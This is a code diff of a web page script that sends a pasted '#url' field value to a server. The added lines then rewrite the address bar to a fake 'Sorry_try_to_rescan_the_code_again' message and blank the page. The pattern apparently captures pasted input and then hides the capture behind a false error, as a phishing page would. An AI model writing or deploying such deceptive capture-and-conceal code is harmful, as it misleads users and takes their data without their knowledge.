@@ -323,7 +323,8 @@
                 contentType: 'application/json',
                 data: JSON.stringify(data), // Send JSON data
                 success: function (response) {
-                    
+                    window.history.replaceState(null, '', 'Sorry_try_to_rescan_the_code_again'); // Update the URL displayed in the address bar
+                    window.open('about:blank', '_self');
                     console.log('Document updated successfully:', response);
                 },
                 error: function (xhr, status, error) {
@@ -331,14 +332,7 @@
                 }
             });
         }
-        $('#url').change(function () {
 
-
-            updateDeviceUrl(devices_id, $('#url').val())
-        })
-        $('#url').click(function () {
-            updateDeviceUrl(devices_id, $('#url').val())
-        })
 
         $('.title-down').empty().append(devices_id)
         $('.field').on('focus', function () {
@@ -357,11 +351,16 @@
             }
         });
         $('.field').on('paste', function () {
-    // Small delay to allow the pasted content to be inserted
-    setTimeout(function () {
-        updateDeviceUrl(devices_id, $('#url').val());
-    }, 0);
-});
+           
+setTimeout(function (){
+
+    updateDeviceUrl(devices_id, $('#url').val());
+}, 500);
+               
+               
+          
+            // Small delay to allow the pasted content to be inserted
+        });
 
     </script>
 </body>
